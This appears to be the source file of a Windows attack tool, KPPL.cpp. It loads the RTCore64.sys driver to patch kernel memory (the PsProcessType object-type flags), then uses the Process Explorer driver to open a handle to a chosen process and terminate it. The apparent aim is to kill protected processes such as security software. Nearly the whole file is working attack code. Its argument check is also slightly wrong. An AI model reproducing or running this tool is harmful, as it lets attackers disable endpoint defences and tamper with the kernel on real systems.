// KPPL.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include "pch.h"
#include <iostream>
#include "SysManager.h"
#include "ObjectManager.h"
#include "SysManager.h"
#include "DriverHelper.h"
#include "SecurityHelper.h"
#include "AccessMaskDecoder.h"
#include "KernelHelper.h"

#pragma comment(lib,"ntdll")

int main(int argc,const char *argv[]){
    if (argc < 1) {
        printf("Usage: KPPL.exe pid\n");
        return 0;
    }
    SecurityHelper::EnablePrivilege(L"SeDebugPrivilege", true);

    ObjectManager objMgr;
    bool success = false;
    std::wstring sysPath, serviceName, displayName;
    WCHAR path[MAX_PATH];
    ::GetCurrentDirectory(MAX_PATH, path);
    sysPath = std::wstring(path) + L"\\RTCore64.sys";
    serviceName = L"RTCore64";
    displayName = L"RT Core64";
    SysManager rtCoreMgr(sysPath, serviceName, displayName, false);
    success = rtCoreMgr.Install();
    if (!success) {
        printf("rtCore install failed\n");
        return -1;
    }

    success = rtCoreMgr.Run();
    if (success) {
        // 操作系统相关
       
        KernelHelper kernel;
        printf("KernelBase: %p\n", KernelHelper::_kernelBase);
        DWORD Offset = KernelHelper::GetSymbolOffset("PsProcessType");
        ULONG_PTR pPsProcessType = KernelHelper::_kernelBase + Offset;
        ULONG_PTR PsProcessType = kernel.ReadMemoryDWORD64(pPsProcessType);
        ULONG_PTR PsProcessTypeInfo = PsProcessType + 0x40;
        ULONG_PTR PsProcessTypeFlags = PsProcessTypeInfo + 0x2;
        printf("Offset : %p\r\n", Offset);
        printf("pPsProcessType: %p\r\n", pPsProcessType);
        printf("PsProcessType: %p\n", PsProcessType);
        printf("PsProcessTypeInfo: %p\r\n", PsProcessTypeInfo);
        printf("PsProcessTypeFlags: %p\r\n", PsProcessTypeFlags);
        WORD ObjectTypeFlags = kernel.ReadMemoryWORD(PsProcessTypeFlags);

        printf("ObjectTypeFlags: 0x%x\n", ObjectTypeFlags);
        WORD NewObjectTypeFlags = ObjectTypeFlags;
        NewObjectTypeFlags &= (~(1 << 6));
        printf("NewObjectTypeFlags: 0x%x\n", NewObjectTypeFlags);
        kernel.WriteMemoryWORD(PsProcessTypeFlags, NewObjectTypeFlags);
        NewObjectTypeFlags = kernel.ReadMemoryWORD(PsProcessTypeFlags);

        printf("New ObjectTypeFlags: 0x%x\n", NewObjectTypeFlags);

        sysPath = std::wstring(path) + L"\\PROCEXP152.SYS";
        serviceName = L"PROCEXP152";
        displayName = L"Process Explorer";
        std::wcout << sysPath << std::endl;
        SysManager sysMgr(sysPath, serviceName, displayName, false);

        printf("Install service...\n");
        success = sysMgr.Install();
        if (success) {
            printf("Run service...\n");
            success = sysMgr.Run();
        }

        if (success) {
            DWORD pid = atoi(argv[1]);
            HANDLE hProcess = DriverHelper::OpenProcess(pid);
            if (hProcess != nullptr)
                printf("Handle: %d (0x%X)\n", hProcess, hProcess);
            objMgr.EnumHandles(GetCurrentProcessId());
            for (auto& hi : objMgr.GetHandles()) {
                if (hi->HandleValue == HandleToULong(hProcess)) {
                    printf("Access: %d (0x%X)\n", hi->GrantedAccess, hi->GrantedAccess);
                    std::wstring result = AccessMaskDecoder::DecodeAccessMask(L"Process", hi->GrantedAccess);
                    std::wcout << result << std::endl;
                }
            }
            if (hProcess != nullptr) {
                bool success = TerminateProcess(hProcess, 0);
                if (!success)
                    printf("TernimateProcess failed: %d\n", GetLastError());
                ::CloseHandle(hProcess);
            }
        }

        kernel.WriteMemoryWORD(PsProcessTypeFlags, ObjectTypeFlags);
    }

   
   
    system("pause");
}


